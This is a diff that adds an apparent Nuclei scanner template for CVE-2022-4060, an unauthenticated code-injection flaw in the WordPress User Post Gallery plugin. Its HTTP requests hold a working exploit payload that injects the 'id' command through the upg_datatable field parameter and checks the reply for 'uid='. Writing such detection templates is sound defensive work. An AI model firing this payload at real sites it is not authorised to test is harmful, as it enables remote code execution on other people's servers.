@@ -1,0 +1,48 @@
+id: CVE-2022-4060
+info:
+  name: WordPress plugins User Post Gallery upg_datatable RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    WordPress plugin User Post Gallery 2.19 and earlier versions contain a code injection
+    vulnerability due to an improperly secured callback function. This allows any user to execute
+    arbitrary code on the site.
+  reference:
+    - https://wpscan.com/vulnerability/8f982ebd-6fc5-452d-8280-42e027d01b1e
+  tags: [code-execution, wordpress]
+  classification:
+    cve-id: CVE-2022-4060
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+http:
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:id:NULL:NULL HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "recordsTotal"
+          - "recordsFiltered"
+          - "uid="
+          - "gid="
+  - raw:
+      - |
+        GET /wp-admin/admin-ajax.php?action=upg_datatable&field=field:exec:{{cmd}}:NULL:NULL HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+    payloads:
+      cmd:
+        - "id"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        words:
+          - "recordsTotal"
+          - "uid="
